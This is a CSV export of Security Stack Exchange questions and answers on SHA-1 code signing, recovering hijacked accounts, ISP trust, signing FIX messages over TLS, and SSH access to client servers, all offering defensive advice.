Post Link,QuestionId,QuestionTitle,QuestionBody,QuestionScore,QuestionAnswersCount,AnswerId,AnswerBody,AnswerScore
"270626","270626",".exe with Digital Signature, showing SHA1 but the Certificate is SHA384, is it secure?","<p>For this file it shows SHA1:</p>
<p><a href=""https://i.stack.imgur.com/WPouT.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/WPouT.png"" alt="".exe properties"" /></a></p>
<p>But going into details the certificate looks like this:</p>
<p><a href=""https://i.stack.imgur.com/yodkz.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/yodkz.png"" alt=""details"" /></a></p>
<p>I know SHA1 is an outdated algorithm but I'm not sure about this nested construction. Is this insecure? Which of the two parts matter, does it matter that one is SHA-384 and the other SHA-1 does it compromise it in any form?</p>
","8","3","270628","<p>It is <strong>not ok</strong> to use SHA1 authenticode signatures in 2023, they are not considered secure. Because of quite realistic SHA1 collision, the code might be tampered in the way that it will produce same SHA1 hash and it will look like the data was not tampered.</p>
<p>If you are the owner of this signature, you have to update your signing tools to use more secure algorithms, such as SHA256 or SHA384. If it was created by someone else, it may be reasonable to contact the owner and point to outdated signing practices.</p>
<p>Even if signed file is supposed to run on a systems where SHA2 is not supported, it is possible to attach multiple signatures, where first signature is SHA1 and another that uses SHA2 family:
<a href=""https://i.stack.imgur.com/QUbID.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/QUbID.png"" alt=""enter image description here"" /></a></p>
<p>Speaking about different hashing algorithms, the signature hash algorithm has no connections to hash algorithm in certificate, they are completely independent things.</p>
","11"
"270626","270626",".exe with Digital Signature, showing SHA1 but the Certificate is SHA384, is it secure?","<p>For this file it shows SHA1:</p>
<p><a href=""https://i.stack.imgur.com/WPouT.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/WPouT.png"" alt="".exe properties"" /></a></p>
<p>But going into details the certificate looks like this:</p>
<p><a href=""https://i.stack.imgur.com/yodkz.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/yodkz.png"" alt=""details"" /></a></p>
<p>I know SHA1 is an outdated algorithm but I'm not sure about this nested construction. Is this insecure? Which of the two parts matter, does it matter that one is SHA-384 and the other SHA-1 does it compromise it in any form?</p>
","8","3","270632","<p>As for understanding the 'nested construction', it might help to understand the sequence of operations in this process:</p>
<ol>
<li><p>Phase to Phase created a key pair consisting of a private key and a public key.</p>
</li>
<li><p>Phase to Phase created a certificate signing request (CSR) consisting of their name, the public key created in step 1, and other information pertaining to their organization, and sent this CSR to Sectigo for Sectigo to sign.</p>
</li>
<li><p>Sectigo verified that the public key in the CSR that they received from Phase to Phase above in step 2 actually belongs to Phase to Phase.  Then, Sectigo created a certificate containing this public key and other information from the CSR, then took a SHA384 hash of this certificate, then used their private key to sign the SHA384 hash.  The result of this is the signed certificate whose image you posted.</p>
</li>
<li><p>Phase to Phase took a SHA1 hash of their program Vision951.exe, then used the private key that they created in step 1 to sign the SHA1 hash.</p>
</li>
<li><p>You downloaded Vision951.exe.  To verify the integrity of this program, your OS used Phase to Phase's certificate (created in step 3 above).  First, your OS verified that the certificate was signed by a certificate authority (CA) that it trusts (such as Sectigo).  To do this, it verified the signature using Sectigo's public key.  Your OS trusts Sectigo, therefore it trusts this certificate, therefore it trusts that the public key in this certificate actually belongs to Phase to Phase.  Your OS then proceeded to extract Phase to Phase's public key from the certificate, then it used this public key to verify Phase to Phase's signature (created in step 4 above) on Vision951.exe.</p>
</li>
</ol>
<p>So, there really is no 'nesting' here.  Rather, a chain of trust is built, from the executable program; through the developer of the program (Phase to Phase); to the root of trust, which is the certificate authority (Sectigo).</p>
<p>All of the above is fairly typical, except for step 4.  The SHA1 hash function is known to be <a href=""https://threatpost.com/exploit-fully-breaks-sha-1/151697/"" rel=""nofollow noreferrer"">vulnerable to collision attacks</a>.  Even though SHA1 has not been found to be vulnerable to second preimage attacks (which are really what matter when it comes to hashing for the purpose of signing, as pointed out in the answer by <a href=""https://security.stackexchange.com/users/161833/alex-w"">Alex W</a>) - once a crypto algorithm shows any sign of weakness whatsoever, security people tend to run from it.  See <a href=""https://security.stackexchange.com/questions/152142/what-are-the-implications-of-a-sha-1-collision-being-found"">What are the implications of a SHA-1 collision being found?</a> for more interesting reading on this subject.</p>
","5"
"270626","270626",".exe with Digital Signature, showing SHA1 but the Certificate is SHA384, is it secure?","<p>For this file it shows SHA1:</p>
<p><a href=""https://i.stack.imgur.com/WPouT.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/WPouT.png"" alt="".exe properties"" /></a></p>
<p>But going into details the certificate looks like this:</p>
<p><a href=""https://i.stack.imgur.com/yodkz.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/yodkz.png"" alt=""details"" /></a></p>
<p>I know SHA1 is an outdated algorithm but I'm not sure about this nested construction. Is this insecure? Which of the two parts matter, does it matter that one is SHA-384 and the other SHA-1 does it compromise it in any form?</p>
","8","3","270644","<p>The other answers correctly point out that SHA1 is not a watertight hashing algorithm: <a href=""https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html"" rel=""noreferrer"">SHA1 is vulnerable to collision attacks.</a> However, there are no known vulnerabilities to SHA1's <a href=""https://en.wikipedia.org/wiki/Preimage_attack"" rel=""noreferrer""><em>preimage resistance</em> nor <em>second preimage resistance</em></a>, which are properties regarding finding a hash collision for a <strong>specific</strong> hash/input (as opposed to finding a collision in two arbitrary hashes/inputs). So whether you can in practice trust this signature is down to whether its security relies on SHA1's resistance to collision attacks.</p>
<p>However, due to the certificate signing a <strong>specific</strong> SHA1 signature of an executable, collision attacks are not relevant. Collision attacks occur from the two hashes you're finding a collision in being free to change.
This instead would require one to find a file which gives a SHA1 hash of the signed file's SHA1 hash—a much harder problem and one which SHA1 has no practical public attack for. Authenticode does not rely on collision resistance—only the preimage resistances.</p>
<p>So therefore, providing a malicious executable which has the same SHA1 hash as the SHA1 hash of the legitimate, signed executable is considered completely infeasible, and in practice you can consider this signature valid and the file safe.</p>
<p>As an additional note, SHA1 should still be phased out in software and libraries as it can be easy to unwittingly rely on a property of a hash function which you otherwise think you're not relying on. We should be ensuring that only hash functions with both preimage resistance(s) and collision resistance are supported going forwards in new software and updates. But this doesn't mean that, in this case, it's not providing the securiy guarantees desired.</p>
","11"
"270515","270515","Enabling a user to revert a hacked change in their email","<p>I am writing a web app and I want to set up a system where, when a user changes their email, it gives them a link to have the change revert back. The purpose of this is for when a hacker changes an account email. In this case the user can't log in without it being reverted. Login is email + password.</p>
<p>I need to handle a hacker doing multiple changes trying to use up a revert list. And I don't want the ability to revert by just entering an email as that would allow major mischief by hackers. So I came up with the following. Will this work? Is there a better approach?</p>
<ol>
<li>On an email change, I create a GUID and then save in the DB the GUID, old email, and old password hash.</li>
<li>The email sent to them lists the change and says to revert click the link. The link has the GUID in it.</li>
<li>Upon receiving that link, it reverts back to the previous email &amp; password hash.</li>
<li>If possible (I'm using Blazor server), it will log out any other sessions for this user.</li>
<li>Should I then force them to use 2FA?</li>
<li>Nightly clean-up will delete any revert records that are over a month old.</li>
</ol>
<p>Will this work? Any security holes?</p>
<hr />
<p>Based on the below replies (thank you) then what about the following? (Asking here because I don't think it's worth a distinct new question.)</p>
<p>When it is changed, send an email to the old &amp; new email with a GUID &amp; link. Clicking that link, which has the GUID as a parameter, asks if they want the account disabled and provides the support phone &amp; email for them to call.</p>
<p>That way we stop any further damage and then turn it over to human beings to figure out what to do.</p>
","8","5","270517","<p>Your scheme completely defeats the purpose of changing the e-mail address. When a user wants to change their address, there's a good chance they're doing it because they no longer control the old address. If you then let anybody who does have access to the old address revert the change (against the will of the legitimate user) and take over the user account, you're actually creating a vulnerability.</p>
<p>This could also lead to an interesting ping-pong of address changes, where the attacker and the legitimate user take turns in reverting the other party's address.</p>
<p>You won't get around the fact that a user has to authenticate with <em>something</em>. If they've forgotten their password, they should be able to authenticate using their e-mail account and change the password (the classical I-forgot-my-password e-mail). If they no longer control their e-mail account, they should be able to authenticate with their password and then change the e-mail address. If they've lost both, it's over -- unless you introduce a third authentication option, e. g. security questions which are checked over the phone.</p>
","39"
"270515","270515","Enabling a user to revert a hacked change in their email","<p>I am writing a web app and I want to set up a system where, when a user changes their email, it gives them a link to have the change revert back. The purpose of this is for when a hacker changes an account email. In this case the user can't log in without it being reverted. Login is email + password.</p>
<p>I need to handle a hacker doing multiple changes trying to use up a revert list. And I don't want the ability to revert by just entering an email as that would allow major mischief by hackers. So I came up with the following. Will this work? Is there a better approach?</p>
<ol>
<li>On an email change, I create a GUID and then save in the DB the GUID, old email, and old password hash.</li>
<li>The email sent to them lists the change and says to revert click the link. The link has the GUID in it.</li>
<li>Upon receiving that link, it reverts back to the previous email &amp; password hash.</li>
<li>If possible (I'm using Blazor server), it will log out any other sessions for this user.</li>
<li>Should I then force them to use 2FA?</li>
<li>Nightly clean-up will delete any revert records that are over a month old.</li>
</ol>
<p>Will this work? Any security holes?</p>
<hr />
<p>Based on the below replies (thank you) then what about the following? (Asking here because I don't think it's worth a distinct new question.)</p>
<p>When it is changed, send an email to the old &amp; new email with a GUID &amp; link. Clicking that link, which has the GUID as a parameter, asks if they want the account disabled and provides the support phone &amp; email for them to call.</p>
<p>That way we stop any further damage and then turn it over to human beings to figure out what to do.</p>
","8","5","270518","<p>(Not a direct answer to OP's question, which I believe deserves its own proper answer without being turned into an X-Y thing, but this is too long for a comment:</p>
<p>Using a link to revert the email change is risky:</p>
<ul>
<li>A link/GET request should never have side effects as security solutions might load it before the user ever does -&gt; The link will have to lead to some kind of confirmation button</li>
<li>Reverting the email is not sufficient as the password is also likely changed by the hacker, so the user will have to go through the password recovery steps</li>
<li>You created the problem of tracking and invalidating links and emails</li>
<li>Audit logs will be hard to follow</li>
</ul>
<p>It will be simpler and safer to send a &quot;freeze my account and chat to support&quot; link instead. Support can then validate some additional info.</p>
<p>Alternatively, request proof of access to the original email address (via a link in email) before allowing it to be changed. And force people who have lost access through manual support with additional validation.</p>
","6"
"270515","270515","Enabling a user to revert a hacked change in their email","<p>I am writing a web app and I want to set up a system where, when a user changes their email, it gives them a link to have the change revert back. The purpose of this is for when a hacker changes an account email. In this case the user can't log in without it being reverted. Login is email + password.</p>
<p>I need to handle a hacker doing multiple changes trying to use up a revert list. And I don't want the ability to revert by just entering an email as that would allow major mischief by hackers. So I came up with the following. Will this work? Is there a better approach?</p>
<ol>
<li>On an email change, I create a GUID and then save in the DB the GUID, old email, and old password hash.</li>
<li>The email sent to them lists the change and says to revert click the link. The link has the GUID in it.</li>
<li>Upon receiving that link, it reverts back to the previous email &amp; password hash.</li>
<li>If possible (I'm using Blazor server), it will log out any other sessions for this user.</li>
<li>Should I then force them to use 2FA?</li>
<li>Nightly clean-up will delete any revert records that are over a month old.</li>
</ol>
<p>Will this work? Any security holes?</p>
<hr />
<p>Based on the below replies (thank you) then what about the following? (Asking here because I don't think it's worth a distinct new question.)</p>
<p>When it is changed, send an email to the old &amp; new email with a GUID &amp; link. Clicking that link, which has the GUID as a parameter, asks if they want the account disabled and provides the support phone &amp; email for them to call.</p>
<p>That way we stop any further damage and then turn it over to human beings to figure out what to do.</p>
","8","5","270519","<p>Some considerations:</p>
<p>Changing the email address associated with an account may not be the first move the hacker makes. By only tracking changes made after the email change, you may revert to an already altered account.</p>
<p>You should forcibly reset the password and send a password reset link if the user reverts to a previous email. In most cases of account compromise the password you'd be reverting to is already compromised. This still doesn't allow for situations where the user's email account is compromised but there's only so much you can do without MFA already configured.</p>
<p>MFA is a good suggestion but if they didn't have it previously and the user's email account is compromised, not just their password, then the attacker can then stake an even stronger claim to the account. I don't really see any way around this issue (potentially geo-restrictions? Known IP is too strict as it could have changed but if the user is known to be in the UK don't let it be reset from Peru for example).</p>
<p>You should have a time limitation on reverting the change. Hours or a small number of days is too short, the legit user might not be available to reclaim their account. A few weeks to a month sound reasonable to me. Longer than that and it's going to be more of a pain to track every change and runs a higher chance that someone compromises their email account and &quot;reclaims&quot; the account.</p>
<p>In general, I feel like major account changes such as changing the email address should typically require the old email address to confirm before proceeding. I have, however, seen a situation where access to the old email address was lost as the account was closed, so if you go that route, you should have some process to allow for that too.</p>
","2"
"270515","270515","Enabling a user to revert a hacked change in their email","<p>I am writing a web app and I want to set up a system where, when a user changes their email, it gives them a link to have the change revert back. The purpose of this is for when a hacker changes an account email. In this case the user can't log in without it being reverted. Login is email + password.</p>
<p>I need to handle a hacker doing multiple changes trying to use up a revert list. And I don't want the ability to revert by just entering an email as that would allow major mischief by hackers. So I came up with the following. Will this work? Is there a better approach?</p>
<ol>
<li>On an email change, I create a GUID and then save in the DB the GUID, old email, and old password hash.</li>
<li>The email sent to them lists the change and says to revert click the link. The link has the GUID in it.</li>
<li>Upon receiving that link, it reverts back to the previous email &amp; password hash.</li>
<li>If possible (I'm using Blazor server), it will log out any other sessions for this user.</li>
<li>Should I then force them to use 2FA?</li>
<li>Nightly clean-up will delete any revert records that are over a month old.</li>
</ol>
<p>Will this work? Any security holes?</p>
<hr />
<p>Based on the below replies (thank you) then what about the following? (Asking here because I don't think it's worth a distinct new question.)</p>
<p>When it is changed, send an email to the old &amp; new email with a GUID &amp; link. Clicking that link, which has the GUID as a parameter, asks if they want the account disabled and provides the support phone &amp; email for them to call.</p>
<p>That way we stop any further damage and then turn it over to human beings to figure out what to do.</p>
","8","5","270522","<p>Maybe you work for a big company like Facebook where the number of users is so huge that you have to automate the process of recovery. But I assume you are not working for such a company and that the number of incidents in any given year is small or downright nil.
So if you're trying to anticipate a hypothetical situation that may never occur, it doesn't look like a smart allocation of resources.</p>
<p>As said already, this could turn into a ping-pong party where the attacker and the legitimate user fight over the compromised account, and you are not solving anything, merely adding confusion and frustration in the process.</p>
<p>But there are quite a few things you can do to improve things. Here are some ideas.
If a change of E-mail address is performed (or changes are made to any other sensitive fields in the user profile),</p>
<ul>
<li><strong>log the details</strong>, because auditing is important and can be crucial during investigations.</li>
<li><strong>send a notification</strong> to the previous E-mail address to notify the user (even though they may no longer own it).</li>
</ul>
<p>Reacting quickly to unauthorized changes is key, because the relevant logs are often short-lived.</p>
<p>Roll out MFA now. That's what you should be doing before devising esoteric approaches. Use the tools already available on the market to tackle the problem at the root. Then the risk of account takeover will decrease.
Of course you'll have other issues. Some people will inevitably lose their tokens and you'll have to vet them manually. Is this a big deal?</p>
<p>What you could do perhaps is to require users to provide an <strong>alternative communication channel</strong> like a secondary E-mail address, a phone number. Because it's less likely that a hacker will be able to control all of those.</p>
<p>You could also add a secret question at signup (don't show the answers in the control panel then). The idea here is to have something more permanent, possibly frozen. But it's not without problems, because people make up stuff or forget answers, or give out guessable answers, so I would prefer to rely on a mix of possibilities.</p>
<p>But if there is a secret question in place, you could use it as a <strong>challenge</strong> before a change of E-mail address is allowed. Or present a 2FA challenge.
This creates one more obstacle for the hacker.</p>
<p>While you are it, you can send notifications by E-mail when multiple authentication failures are made, and cap them. This gives the user an opportunity to react quickly to an ongoing breach.</p>
<p>In short: there is a lot you can do to thwart attempts at account takeover. Invest more time in prevention, rather than trying to fix things in a less than perfect way.</p>
","15"
"270515","270515","Enabling a user to revert a hacked change in their email","<p>I am writing a web app and I want to set up a system where, when a user changes their email, it gives them a link to have the change revert back. The purpose of this is for when a hacker changes an account email. In this case the user can't log in without it being reverted. Login is email + password.</p>
<p>I need to handle a hacker doing multiple changes trying to use up a revert list. And I don't want the ability to revert by just entering an email as that would allow major mischief by hackers. So I came up with the following. Will this work? Is there a better approach?</p>
<ol>
<li>On an email change, I create a GUID and then save in the DB the GUID, old email, and old password hash.</li>
<li>The email sent to them lists the change and says to revert click the link. The link has the GUID in it.</li>
<li>Upon receiving that link, it reverts back to the previous email &amp; password hash.</li>
<li>If possible (I'm using Blazor server), it will log out any other sessions for this user.</li>
<li>Should I then force them to use 2FA?</li>
<li>Nightly clean-up will delete any revert records that are over a month old.</li>
</ol>
<p>Will this work? Any security holes?</p>
<hr />
<p>Based on the below replies (thank you) then what about the following? (Asking here because I don't think it's worth a distinct new question.)</p>
<p>When it is changed, send an email to the old &amp; new email with a GUID &amp; link. Clicking that link, which has the GUID as a parameter, asks if they want the account disabled and provides the support phone &amp; email for them to call.</p>
<p>That way we stop any further damage and then turn it over to human beings to figure out what to do.</p>
","8","5","270541","<p>Frame challenge -- why are you collecting and using a password? Use an external authentication provider and the problem goes away.  I hate sites that collect yet another username and password, a password manager makes it slightly less annoying, but really, if you want security then you should pay for it and get some real security not make it up, and if you don't want to pay for it there are tons of free alternatives.</p>
","0"
"270285","270285","How can I be sure that my internet service provider is safe?","<p>There is a new internet service provider in town that provides fiber internet--their internet is fast and it's proven. Almost everyone in our town switched to their internet. However, I am kind of skeptical to subscribe for some reasons:</p>
<ol>
<li>They don't have a website, just a facebook page with 500 likes :&lt; Their business name is also suspicious as they're only called &quot;Fiber Speed&quot; which is a very common name and doesn't even sound as a business name.</li>
<li>They only operate in small towns, not even more than 10 towns.</li>
<li>They said they get their internet from a popular network in our country and I can confirm that since I saw it in the speedtest but they offer their fiber internet for a cheaper price, I'm not even sure if they operate legally lol.</li>
<li>I don't think they have an office. They also have these flyers that are obviously not professionally designed.</li>
</ol>
<p>I am just worried about my internet security because I do a lot of online bank transactions as I work as a freelancer online. I always use VPN when connected to their network because I don't feel safe.</p>
<p>How can I make sure their internet is safe and they're not trying to spy on the information we share online?</p>
","0","3","270286","<blockquote>
<p>How can I make sure their internet is safe and they're not trying to spy on the information we share online?</p>
</blockquote>
<p>There is no way to ensure that your internet provider is &quot;safe&quot; - whatever this exactly means. Since you have no way to verify the providers infrastructure and to asses the corporation including all its employees, it basically boils down to deriving your trust from the few information you find. This is what you are already doing and it is unlikely you can do more.</p>
<p>There are a few options you can take:</p>
<ul>
<li>Don't use the new internet provider, but continue what you've used so far in the hope that it was better. Note that you unlikely have more reliable information about your current provider than you have about the new one - only that the current one has built a better reputation over time and probably has an interest in maintaining this valuable reputation.</li>
<li>Use the new internet provider in the hope that there are regulations which  address the concerns you have, i.e. privacy laws etc. How much of these regulations exist and how much protection they actually offer depends on where you live.</li>
<li>Use the new internet provider but trust it only for availability. This means using the provider just to get the connectivity to some VPN endpoint. Of course, this basically moves the trust from the ISP to whoever maintains the infrastructure of the VPN endpoint.</li>
</ul>
<p>But, if the company is not meeting your expectations on basic professional appearance (no website, shoddy flyers) then you might not even trust the provider for availability alone. If you depend on availability (i.e. no backup) then you might better stick with what you currently have for now and reevaluate the situation later.</p>
","0"
"270285","270285","How can I be sure that my internet service provider is safe?","<p>There is a new internet service provider in town that provides fiber internet--their internet is fast and it's proven. Almost everyone in our town switched to their internet. However, I am kind of skeptical to subscribe for some reasons:</p>
<ol>
<li>They don't have a website, just a facebook page with 500 likes :&lt; Their business name is also suspicious as they're only called &quot;Fiber Speed&quot; which is a very common name and doesn't even sound as a business name.</li>
<li>They only operate in small towns, not even more than 10 towns.</li>
<li>They said they get their internet from a popular network in our country and I can confirm that since I saw it in the speedtest but they offer their fiber internet for a cheaper price, I'm not even sure if they operate legally lol.</li>
<li>I don't think they have an office. They also have these flyers that are obviously not professionally designed.</li>
</ol>
<p>I am just worried about my internet security because I do a lot of online bank transactions as I work as a freelancer online. I always use VPN when connected to their network because I don't feel safe.</p>
<p>How can I make sure their internet is safe and they're not trying to spy on the information we share online?</p>
","0","3","270287","<p>While I certainly wouldn't recommend using an ISP that seems dubious, there's no need to fully trust an ISP either.</p>
<p>The de-facto standard for any serious online application is to use end-to-end encryption, e. g. through HTTPS. If properly implemented, this reliably prevents the ISP or any other intermediary from reading or manipulating the traffic. The Internet generally shouldn't be considered trustworthy, regardless of the ISP you're using.</p>
<p>Note that DNS traffic (i. e. the domains you're visiting) is usually neither encrypted nor authenticated. If you want to protect this data as well, you need to use a <a href=""https://dnsprivacy.org/public_resolvers/"" rel=""nofollow noreferrer"">DNS resolver which supports encryption</a>.</p>
<p>So both the traffic and DNS lookups can and should be protected in any case. The remaining issue is that metadata -- the IP addresses you communicate with, the time when this happens and the amount of data -- <em>will</em> be visible to your ISP. If that's a problem, there's <a href=""https://www.torproject.org/"" rel=""nofollow noreferrer"">Tor</a>. I'm not sure if I'd consider VPN a solution. As Steffen Ullrich already said, you're just shifting trust from one entity to another, and VPNs aren't necessarily more trustworthy than ISPs.</p>
","3"
"270285","270285","How can I be sure that my internet service provider is safe?","<p>There is a new internet service provider in town that provides fiber internet--their internet is fast and it's proven. Almost everyone in our town switched to their internet. However, I am kind of skeptical to subscribe for some reasons:</p>
<ol>
<li>They don't have a website, just a facebook page with 500 likes :&lt; Their business name is also suspicious as they're only called &quot;Fiber Speed&quot; which is a very common name and doesn't even sound as a business name.</li>
<li>They only operate in small towns, not even more than 10 towns.</li>
<li>They said they get their internet from a popular network in our country and I can confirm that since I saw it in the speedtest but they offer their fiber internet for a cheaper price, I'm not even sure if they operate legally lol.</li>
<li>I don't think they have an office. They also have these flyers that are obviously not professionally designed.</li>
</ol>
<p>I am just worried about my internet security because I do a lot of online bank transactions as I work as a freelancer online. I always use VPN when connected to their network because I don't feel safe.</p>
<p>How can I make sure their internet is safe and they're not trying to spy on the information we share online?</p>
","0","3","270292","<p>There's no such thing as a &quot;trustworthy&quot; or &quot;insecure&quot; ISP.</p>
<ol>
<li><p>When you're connecting to your ISP, you're connected using wires or Wi-Fi both of which can be compromised one way or another. For instance Wi-Fi routers are often hacked because they are not updated automatically or no new firmware is getting released. Many wired routers are not properly configured, e.g. can be accessed using default (simple or leaked) passwords, some routers have &quot;forgotten&quot; vendor backdoors, etc.</p>
</li>
<li><p>Your ISP does not connect to endpoint websites right away, there are numerous other Internet providers/switches/companies in between. Any of them can be compromised.</p>
</li>
</ol>
<p>The net result is the following: when you're connecting to any network you should treat it as compromised. No ifs. If the network is compromised that means:</p>
<ul>
<li>Your OS must be fully updated and secure</li>
<li>Your network ports must be properly firewalled</li>
<li>Your software must be up to date and secure (web browsers, any servers, etc.)</li>
<li>You must be using DoT or DoH. Your resolver should be able to use DNSSEC as well.</li>
<li>You must be using HTTPS for websites where security and privacy are essential (banking/finances/social networks/etc.)</li>
</ul>
","0"
"270130","270130","Using FIX over TLS, is there a need to sign FIX mesages?","<p>We have 2 servers communicating, server A (a server that I own), and server B (server on the internet that I trust). I get some info from server B, which are FIX messages (<a href=""https://en.wikipedia.org/wiki/Financial_Information_eXchange"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/Financial_Information_eXchange</a>).</p>
<p>Server B provided me initially with certificates to implement TLS between us. So now we have a TLS communication between server A and server B exchanging FIX messages.</p>
<p>Noting that TLS does not sign the payloads (in my case the embedded FIX message), do I need to sign the FIX messages before they are sent over TLS?
When do I need to sign payloads? In my mind, TLS is secure, and no one can read the data as it is encrypted, so why would we need to sign the payloads?</p>
","2","4","270131","<p>If you are doing TLS properly (this means using the latest version, and verifying the certificates in the connection are the right ones) nobody can read or edit the data in transit. TLS provides these security features so you don't need to mess with the payload. That's the point.</p>
<p>Reasons to sign the payload anyway might be that one end doesn't know the connection is TLS (e.g. the TLS stops at a reverse proxy which is not the end server) or the same message has to be transmitted through multiple servers (since TLS only protects each connection separately, the server in the middle could edit the payload) or your boss says so because he doesn't know about TLS.</p>
","1"
"270130","270130","Using FIX over TLS, is there a need to sign FIX mesages?","<p>We have 2 servers communicating, server A (a server that I own), and server B (server on the internet that I trust). I get some info from server B, which are FIX messages (<a href=""https://en.wikipedia.org/wiki/Financial_Information_eXchange"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/Financial_Information_eXchange</a>).</p>
<p>Server B provided me initially with certificates to implement TLS between us. So now we have a TLS communication between server A and server B exchanging FIX messages.</p>
<p>Noting that TLS does not sign the payloads (in my case the embedded FIX message), do I need to sign the FIX messages before they are sent over TLS?
When do I need to sign payloads? In my mind, TLS is secure, and no one can read the data as it is encrypted, so why would we need to sign the payloads?</p>
","2","4","270132","<ol>
<li><p>In FIX, signature is <a href=""https://www.fixtrading.org/standards/tagvalue-online/"" rel=""nofollow noreferrer"">optional</a>. It depends on specific business context. You decide, if it is needed or not. For instance, if some clients are not trusted, then signature will definitely make sense. When messages are signed, clients will not be able to say that they have not sent particular message, or that the message was modified.</p>
</li>
<li><p>If you don't trust the connection between the TLS termination point and the application, signature will make unauthorized message modifications impossible.</p>
</li>
</ol>
<p>Further answers can be found <a href=""https://security.stackexchange.com/questions/164883/are-there-reasons-to-sign-files-transported-via-tls"">here</a>.</p>
","1"
"270130","270130","Using FIX over TLS, is there a need to sign FIX mesages?","<p>We have 2 servers communicating, server A (a server that I own), and server B (server on the internet that I trust). I get some info from server B, which are FIX messages (<a href=""https://en.wikipedia.org/wiki/Financial_Information_eXchange"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/Financial_Information_eXchange</a>).</p>
<p>Server B provided me initially with certificates to implement TLS between us. So now we have a TLS communication between server A and server B exchanging FIX messages.</p>
<p>Noting that TLS does not sign the payloads (in my case the embedded FIX message), do I need to sign the FIX messages before they are sent over TLS?
When do I need to sign payloads? In my mind, TLS is secure, and no one can read the data as it is encrypted, so why would we need to sign the payloads?</p>
","2","4","270146","<p>There are two reasons to sign messages:</p>
<ol>
<li>To prevent undetected tampering (provide integrity and authenticity) of messages. TLS takes care of this for you, but only from where it is initiated to where it is terminated; if all your traffic is through a single TLS tunnel that connects the FIX implementations directly - and you're not choosing a very weird cipher suite which omits integrity (no major TLS implementation supports such by default) - then you don't need to worry about this any further. However, many systems don't use a single TLS tunnel for full end-to-end connections, in which case signing can help verify that the message came from who it says and wasn't forged or tampered with before entering (or after leaving) the TLS tunnel.</li>
<li>To provide <a href=""https://en.wikipedia.org/wiki/Non-repudiation"" rel=""nofollow noreferrer""><em>non-repudiation</em></a>, the property that you always know who sent a message and they can't disavow it after the fact. TLS does <em>NOT</em> provide this; after the initial handshake, all TLS traffic is both encrypted and authenticated using a shared symmetric key known to both parties, so either one can undetectably forge messages when e.g. writing to a log of all traffic sent and received. If the messages are individually signed (and ideally also include some replay protection, such as nonces or timestamps or at least sequence numbers, and I know FIX has the last of those and might have the others) then an attacker can't forge or modify messages from another party and introduce them into a log, nor can an attacker credibly disclaim to have sent a message that another party logged, or claim that it was modified by the logging party.</li>
</ol>
<p>Non-repudiation is not always important, and indeed sometimes it's undesirable (for example, in &quot;off the record&quot; messaging systems, you don't <em>want</em> somebody to be able to later conclusively prove you sent a message). It also often has a performance impact (making and verifying digital signatures using asymmetric cryptography is, like all strong asymmetric cryptography, much slower than symmetric encryption and MACs). However, if you are going to log all the traffic and want to preserve a record for any sort of reason (such as auditing, or dispute resolution, or failure recovery, or so on), then you should use be using signed messages. At least some of those are plausibly things you would want for FIX.</p>
<p>Another case where signed messages can sometimes help is if the signing happens in a different system than the TLS tunneling. For example, imagine a cluster where you have your FIX software running on one node, which is connected to a gateway node, and the gateway node is initiating and terminating the TLS connection to your FIX counterparty. If an attacker gains limited access to this cluster, then depending on the inter-node communication security, the attacker might be able to forge messages as coming from the FIX node, such that they'd be sent by the gateway. Requiring that the messages be signed (by a key that the FIX node has, but no other node does) reduces this risk; the attacker must compromise the FIX node itself, rather than the cluster in general, to have any hope of a successful attack. This kind of defense-in-depth is plausibly well worth it for a financial institution.</p>
<p>Obvious caveat: if your counterparty isn't actually <em>verifying</em> the signatures, or at least logging messages for the possibility of future verification, signing is just a waste of cycles and bits. Also, signing adds complexity, and any time you're doing that - especially with an inherently complicated and easy-to-screw-up system like cryptography - you introduce risks. For example, suppose your FIX messages are signed using a private key, and the public key is distributed as an X.509 certificate (the format used by TLS, among other protocols). If the certificate expires before it's replaced with one valid until a later date, your counterparty would stop trusting your signatures, likely leading to otherwise-valid messages being rejected and thus a loss of availability.</p>
<p>So, to answer your question &quot;Using FIX over TLS, is there a need to sign FIX mesages?&quot;, you must consider your use case. Does your counterparty even support signed messages? Are you (or them) going to be verifying the signatures, or at least saving the signed messages for later verification? Do you need non-repudiation, and/or want the extra security of a message signing key that can be stored separately from the TLS private key? Are you ready for the implementation complexity and ongoing maintenance burden of adding an additional cryptosystem to your FIX deployment? If all of those are true, then yes, signing messages will add meaningful security even over TLS, and you should do it. If any of them are no, then it's plausibly not worth it, and almost certainly not <em>needed</em>.</p>
","3"
"270130","270130","Using FIX over TLS, is there a need to sign FIX mesages?","<p>We have 2 servers communicating, server A (a server that I own), and server B (server on the internet that I trust). I get some info from server B, which are FIX messages (<a href=""https://en.wikipedia.org/wiki/Financial_Information_eXchange"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/Financial_Information_eXchange</a>).</p>
<p>Server B provided me initially with certificates to implement TLS between us. So now we have a TLS communication between server A and server B exchanging FIX messages.</p>
<p>Noting that TLS does not sign the payloads (in my case the embedded FIX message), do I need to sign the FIX messages before they are sent over TLS?
When do I need to sign payloads? In my mind, TLS is secure, and no one can read the data as it is encrypted, so why would we need to sign the payloads?</p>
","2","4","270148","<p>Signing adds a different aspect of security, which cannot be replaced by transport security alone.</p>
<p>As a real world example, a sealed envelope makes sure that no one has seen or replaced the message during its delivery transit. However, that does not prove that the message in the envelope was actually sent from a specific person or institution. For this purpose, the message itself would have to be signed by that person or a representative.</p>
","1"
"270079","270079","Leaving SSH access to deployed on prem server -- why is this bad?","<p>I've recently had a conversation with a colleague (in a new job for me) around access to client's servers which are deployed in their premises.</p>
<p>They have said that allowing ssh access to those servers is something that any CISO would run from, so instead to access them they have a REST API interface over https. My understanding is that public key management on SSH is at least as secure as https, so apparently my understanding is not common (or colloquially correct).</p>
<p>What are the issues I'm missing? Is this a genuine thing or concern due to key compromise attacks (which are at least as common as CA compromises).</p>
<p>NOTE: I have tried searching for the answer on the interwebs. Not found anything useful yet.</p>
","4","3","270081","<p>The question is less about SSH vs. HTTPS as the transport protection, but about what actually can be done with the access.</p>
